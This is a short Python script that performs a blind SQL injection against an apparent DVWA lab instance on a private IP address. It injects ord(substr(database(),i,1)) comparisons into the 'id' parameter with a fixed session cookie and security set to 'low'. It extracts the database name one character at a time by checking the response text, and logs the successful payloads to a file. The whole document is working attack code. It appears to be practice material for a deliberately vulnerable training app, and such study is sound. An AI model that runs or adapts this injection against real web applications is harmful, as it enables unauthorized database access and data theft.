import requests
from bs4 import BeautifulSoup

texterr = "User ID is MISSING from the database."
base_url = "http://192.168.236.20/dvwa/vulnerabilities/sqli_blind/"
session_id = "sb35jegkjt33kjgovvptbua022"

for i in range(1, 5):
    for demo in range(1, 128):
        demot = f"1' and ord(substr(database(), {i}, 1)) = {demo} #"
        params = {"id": demot, "Submit": "Submit"}
        cookies = {"PHPSESSID": session_id, "security": "low"}

        response = requests.get(base_url, params=params, cookies=cookies)

        soup = BeautifulSoup(response.text, "html.parser")
        search_results = soup.find_all("pre")
        for result in search_results:
            text = result.text.strip()
            print(demot)
            if (text != texterr) and ("User ID exists in the database." in text):
                with open("example.txt", "a") as file:
                    file.write(demot + "\n")
                break
